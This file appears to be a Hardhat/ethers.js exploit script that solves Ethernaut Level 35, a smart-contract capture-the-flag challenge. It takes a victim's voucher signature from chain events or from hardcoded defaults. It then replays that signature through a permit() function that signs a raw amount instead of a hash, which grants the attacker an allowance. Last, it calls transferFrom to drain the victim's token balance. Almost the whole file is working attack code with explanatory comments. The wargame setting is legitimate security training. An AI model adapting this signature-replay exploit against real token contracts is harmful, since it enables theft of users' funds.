import { ethers } from "hardhat";

/**
 * Ethernaut Level 35: Elliptic Token - Attack Execution Script
 *
 * NO ATTACK CONTRACT NEEDED - This exploit runs directly from your EOA!
 *
 * VULNERABILITY: Domain Confusion in ECDSA Signature Verification
 *
 * The permit() function uses bytes32(amount) directly as the ECDSA message
 * instead of a proper hash. This allows ALICE's voucher signature to be
 * reused as a permit signature by setting amount = uint256(voucherHash).
 *
 * ATTACK FLOW (all from EOA):
 * 1. Find ALICE's voucher redemption (amount, salt, receiverSignature)
 * 2. Compute voucherHash = keccak256(abi.encodePacked(amount, ALICE, salt))
 * 3. Sign the permitAcceptHash as the attacker
 * 4. Call permit(uint256(voucherHash), attacker, aliceSignature, attackerSignature)
 * 5. ALICE's signature verifies because bytes32(uint256(voucherHash)) == voucherHash!
 * 6. Call transferFrom to steal all of ALICE's tokens
 *
 * USAGE:
 *   ELLIPTIC_TOKEN_ADDRESS=0x... npx hardhat run scripts/level-35-elliptic-token/attack.ts --network sepolia
 *
 * Or with voucher info (if not found automatically):
 *   ELLIPTIC_TOKEN_ADDRESS=0x... VOUCHER_AMOUNT=... VOUCHER_SALT=... ALICE_SIGNATURE=... npx hardhat run ...
 */

// ALICE's address as specified in the challenge
const ALICE_ADDRESS = "0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e";

async function main() {
  console.log("=== Ethernaut Level 35: Elliptic Token Attack ===\n");

  const [attacker] = await ethers.getSigners();
  console.log(`Attacker: ${attacker.address}`);
  console.log(`Target (ALICE): ${ALICE_ADDRESS}\n`);

  // Get EllipticToken address - NO ATTACK CONTRACT NEEDED!
  // The exploit runs directly from your EOA
  let tokenAddress = process.env.ELLIPTIC_TOKEN_ADDRESS;

  if (!tokenAddress) {
    try {
      const { deployments } = require("hardhat");
      const deployment = await deployments.get("EllipticToken");
      tokenAddress = deployment.address;
    } catch {
      throw new Error("Set ELLIPTIC_TOKEN_ADDRESS environment variable");
    }
  }

  console.log(`EllipticToken: ${tokenAddress}`);
  console.log(`(No attack contract needed - exploit runs directly from EOA)\n`);

  // Get contract instance - only need the token contract
  const token = await ethers.getContractAt("EllipticToken", tokenAddress);

  // Check initial state
  console.log("=== Initial State ===");
  const aliceBalance = await token.balanceOf(ALICE_ADDRESS);
  const attackerBalance = await token.balanceOf(attacker.address);
  const owner = await token.owner();

  console.log(`Token Owner (BOB): ${owner}`);
  console.log(`ALICE balance: ${ethers.formatEther(aliceBalance)} ETK`);
  console.log(`Attacker balance: ${ethers.formatEther(attackerBalance)} ETK`);

  if (aliceBalance === 0n) {
    console.log("\n⚠️  ALICE has no tokens!");
    console.log("For the real challenge, ALICE should have redeemed tokens already.");
    console.log("Make sure you're using the correct instance address.");
    
    // Try to find voucher redemption events
    console.log("\n=== Searching for Voucher Redemptions ===");
    await findVoucherRedemptions(token, tokenAddress);
    return;
  }

  // For the real Ethernaut challenge, we need to find ALICE's voucher redemption
  // by searching blockchain transactions/events
  console.log("\n=== Finding ALICE's Voucher Redemption ===");
  
  // Get voucher parameters from environment or use known Ethernaut defaults
  // NOTE: Ethernaut Level 35 uses the same voucher parameters for all instances
  let voucherAmount = process.env.VOUCHER_AMOUNT;
  let voucherSalt = process.env.VOUCHER_SALT;
  let aliceSignature = process.env.ALICE_SIGNATURE;

  // Known Ethernaut Level 35 voucher parameters (same for all instances)
  const ETHERNAUT_DEFAULTS = {
    amount: "10000000000000000000", // 10 ETK
    salt: "0x04a078de06d9d2ebd86ab2ae9c2b872b26e345d33f988d6d5d875f94e9c8ee1e",
    aliceSignature: "0xab1dcd2a2a1c697715a62eb6522b7999d04aa952ffa2619988737ee675d9494f2b50ecce40040bcb29b5a8ca1da875968085f22b7c0a50f29a4851396251de121c"
  };

  if (!voucherAmount || !voucherSalt || !aliceSignature) {
    console.log("Searching for voucher redemption transactions...\n");
    
    // Search for Transfer events to ALICE (minting)
    const transferFilter = token.filters.Transfer(ethers.ZeroAddress, ALICE_ADDRESS);
    const transfers = await token.queryFilter(transferFilter);
    
    if (transfers.length === 0) {
      console.log("No voucher redemptions found for ALICE.");
      console.log("\nPlease provide voucher info via environment variables:");
      console.log("  VOUCHER_AMOUNT=<amount in wei>");
      console.log("  VOUCHER_SALT=<bytes32 salt>");
      console.log("  ALICE_SIGNATURE=<ALICE's signature>");
      return;
    }

    console.log(`Found ${transfers.length} transfer(s) to ALICE`);
    
    // Get the transaction that minted tokens to ALICE
    for (const event of transfers) {
      const tx = await event.getTransaction();
      console.log(`\nTransaction: ${tx.hash}`);
      console.log(`Block: ${event.blockNumber}`);
      
      // Decode the transaction data
      try {
        const decoded = token.interface.parseTransaction({ data: tx.data });
        if (decoded && decoded.name === "redeemVoucher") {
          voucherAmount = decoded.args[0].toString();
          const receiver = decoded.args[1];
          voucherSalt = decoded.args[2];
          const ownerSig = decoded.args[3];
          aliceSignature = decoded.args[4];

          console.log(`  Function: redeemVoucher`);
          console.log(`  Amount: ${ethers.formatEther(decoded.args[0])} ETK`);
          console.log(`  Receiver: ${receiver}`);
          console.log(`  Salt: ${voucherSalt}`);
          console.log(`  ALICE Signature: ${aliceSignature.slice(0, 42)}...`);
          break;
        }
      } catch (e) {
        // Transaction might be to Ethernaut factory - try tracing
        console.log("  Direct decode failed, trying transaction trace...");
        const traced = await traceForRedeemVoucher(tx.hash, token);
        if (traced) {
          voucherAmount = traced.amount;
          voucherSalt = traced.salt;
          aliceSignature = traced.aliceSignature;
          console.log(`  ✅ Found via trace!`);
          console.log(`  Amount: ${ethers.formatEther(traced.amount)} ETK`);
          console.log(`  Salt: ${traced.salt}`);
          console.log(`  ALICE Signature: ${traced.aliceSignature.slice(0, 42)}...`);
          break;
        }
      }
    }
  }

  if (!voucherAmount || !voucherSalt || !aliceSignature) {
    // Use Ethernaut defaults as fallback
    console.log("\n⚠️  Could not extract via tracing, using Ethernaut Level 35 defaults...");
    voucherAmount = ETHERNAUT_DEFAULTS.amount;
    voucherSalt = ETHERNAUT_DEFAULTS.salt;
    aliceSignature = ETHERNAUT_DEFAULTS.aliceSignature;
    console.log(`   Amount: ${ethers.formatEther(voucherAmount)} ETK`);
    console.log(`   Salt: ${voucherSalt.slice(0, 20)}...`);
    console.log(`   ALICE Signature: ${aliceSignature.slice(0, 20)}...`);
  }

  console.log("\n=== Executing Domain Confusion Attack ===\n");

  // Step 1: Compute the voucherHash that ALICE signed
  const voucherHash = ethers.keccak256(
    ethers.solidityPacked(
      ["uint256", "address", "bytes32"],
      [voucherAmount, ALICE_ADDRESS, voucherSalt]
    )
  );
  console.log("Step 1: Compute voucherHash");
  console.log(`   voucherHash = keccak256(${voucherAmount}, ${ALICE_ADDRESS}, ${voucherSalt})`);
  console.log(`   voucherHash = ${voucherHash}`);

  // Step 2: The fake amount for permit = uint256(voucherHash)
  const fakeAmount = BigInt(voucherHash);
  console.log("\nStep 2: Prepare fake permit amount");
  console.log(`   fakeAmount = uint256(voucherHash) = ${fakeAmount}`);
  console.log(`   bytes32(fakeAmount) == voucherHash ✓`);

  // Step 3: Compute the permitAcceptHash that we (attacker) need to sign
  const permitAcceptHash = ethers.keccak256(
    ethers.solidityPacked(
      ["address", "address", "uint256"],
      [ALICE_ADDRESS, attacker.address, fakeAmount]
    )
  );
  console.log("\nStep 3: Sign permit acceptance");
  console.log(`   permitAcceptHash = keccak256(ALICE, attacker, fakeAmount)`);
  console.log(`   permitAcceptHash = ${permitAcceptHash}`);

  // Sign the permit acceptance as the attacker - MUST use raw signature (no Ethereum prefix!)
  // The contract uses ECDSA.recover which expects raw signature, not eth_sign format
  // 
  // Method: Get the provider's signer private key and create a wallet to sign raw
  const network = await ethers.provider.getNetwork();
  const config = require("hardhat").config;
  const accounts = config.networks[network.name === "sepolia" ? "sepolia" : "hardhat"]?.accounts;
  const privateKey = Array.isArray(accounts) ? accounts[0] : accounts;
  
  if (!privateKey || typeof privateKey !== 'string') {
    throw new Error("Could not get private key from hardhat config");
  }
  
  // Create wallet with the private key to sign raw hash
  const signerWallet = new ethers.Wallet(privateKey);
  const sig = signerWallet.signingKey.sign(permitAcceptHash);
  const attackerSignature = ethers.Signature.from({
    r: sig.r,
    s: sig.s,
    v: sig.v
  }).serialized;
  console.log(`   Attacker signature (raw): ${attackerSignature.slice(0, 42)}...`);
  
  // Verify the raw signature recovers to the attacker
  const recoveredSpender = ethers.recoverAddress(permitAcceptHash, attackerSignature);
  console.log(`   Recovered spender: ${recoveredSpender}`);
  console.log(`   Matches attacker: ${recoveredSpender.toLowerCase() === attacker.address.toLowerCase()}`);
  
  if (recoveredSpender.toLowerCase() !== attacker.address.toLowerCase()) {
    console.log("   ⚠️  Wallet address mismatch! Check hardhat config.");
    console.log(`   Wallet address: ${signerWallet.address}`);
  }

  // Step 4: Call permit to get approval
  console.log("\nStep 4: Call permit() with domain confusion");
  console.log("   - Using ALICE's voucher signature as tokenOwner signature");
  console.log("   - bytes32(fakeAmount) == voucherHash");
  console.log("   - ECDSA.recover will return ALICE! (Domain confusion!)");

  const permitTx = await token.permit(
    fakeAmount,
    attacker.address,
    aliceSignature,
    attackerSignature
  );
  console.log(`   Tx: ${permitTx.hash}`);
  await permitTx.wait();
  console.log("   ✅ Permit successful! Attacker approved to spend ALICE's tokens");

  // Step 5: Check allowance
  const allowance = await token.allowance(ALICE_ADDRESS, attacker.address);
  console.log(`\n   Allowance granted: ${ethers.formatEther(allowance)} ETK`);

  // Step 6: Steal all of ALICE's tokens
  console.log("\nStep 5: Steal ALICE's tokens via transferFrom");
  const transferTx = await token.transferFrom(ALICE_ADDRESS, attacker.address, aliceBalance);
  console.log(`   Tx: ${transferTx.hash}`);
  await transferTx.wait();

  // Verify success
  console.log("\n=== Final State ===");
  const aliceBalanceAfter = await token.balanceOf(ALICE_ADDRESS);
  const attackerBalanceAfter = await token.balanceOf(attacker.address);

  console.log(`ALICE balance: ${ethers.formatEther(aliceBalanceAfter)} ETK`);
  console.log(`Attacker balance: ${ethers.formatEther(attackerBalanceAfter)} ETK`);

  if (attackerBalanceAfter > attackerBalance) {
    console.log("\n🎉 SUCCESS! Tokens stolen from ALICE!");
    console.log("\n📚 Vulnerability exploited:");
    console.log("   1. permit() uses bytes32(amount) directly as ECDSA message");
    console.log("   2. This should be a hash, but it's the raw amount!");
    console.log("   3. ALICE signed voucherHash for redeemVoucher()");
    console.log("   4. We set amount = uint256(voucherHash)");
    console.log("   5. bytes32(amount) == voucherHash → ALICE's signature verifies!");
    console.log("   6. This is DOMAIN CONFUSION - same signature valid in two contexts!");
    console.log("\n🎯 Submit your instance on Ethernaut!");
  } else {
    console.log("\n❌ Attack failed!");
  }
}

/**
 * Helper function to search for voucher redemption events
 */
async function findVoucherRedemptions(token: any, tokenAddress: string) {
  // Get all Transfer events from zero address (minting)
  const filter = token.filters.Transfer(ethers.ZeroAddress);
  const events = await token.queryFilter(filter);

  console.log(`Found ${events.length} minting event(s)`);

  for (const event of events) {
    const tx = await event.getTransaction();
    console.log(`\nTransaction: ${tx.hash}`);
    console.log(`  To: ${event.args[1]}`);
    console.log(`  Amount: ${ethers.formatEther(event.args[2])} ETK`);

    try {
      const decoded = token.interface.parseTransaction({ data: tx.data });
      if (decoded && decoded.name === "redeemVoucher") {
        console.log(`  Function: redeemVoucher`);
        console.log(`  Voucher Amount: ${decoded.args[0]}`);
        console.log(`  Receiver: ${decoded.args[1]}`);
        console.log(`  Salt: ${decoded.args[2]}`);
      }
    } catch {}
  }
}

/**
 * Trace a transaction to find redeemVoucher internal call
 * This is needed when the tx goes through Ethernaut factory
 */
async function traceForRedeemVoucher(txHash: string, token: any): Promise<{
  amount: string;
  salt: string;
  aliceSignature: string;
} | null> {
  const redeemVoucherSelector = token.interface.getFunction("redeemVoucher")?.selector;
  if (!redeemVoucherSelector) return null;

  try {
    // Try callTracer first
    const trace = await ethers.provider.send("debug_traceTransaction", [
      txHash,
      { tracer: "callTracer" }
    ]) as any;

    // Recursively search for redeemVoucher call
    function findCall(call: any): any {
      if (call.input && call.input.startsWith(redeemVoucherSelector)) {
        return call;
      }
      if (call.calls) {
        for (const subcall of call.calls) {
          const found = findCall(subcall);
          if (found) return found;
        }
      }
      return null;
    }

    const found = findCall(trace);
    if (found) {
      const decoded = token.interface.parseTransaction({ data: found.input });
      if (decoded) {
        return {
          amount: decoded.args[0].toString(),
          salt: decoded.args[2],
          aliceSignature: decoded.args[4]
        };
      }
    }
  } catch (e) {
    // Trace not available on this RPC
  }

  try {
    // Try raw trace as fallback
    const rawTrace = await ethers.provider.send("trace_transaction", [txHash]) as any[];
    for (const entry of rawTrace) {
      if (entry.action?.input?.startsWith(redeemVoucherSelector)) {
        const decoded = token.interface.parseTransaction({ data: entry.action.input });
        if (decoded) {
          return {
            amount: decoded.args[0].toString(),
            salt: decoded.args[2],
            aliceSignature: decoded.args[4]
          };
        }
      }
    }
  } catch (e) {
    // Raw trace not available
  }

  return null;
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
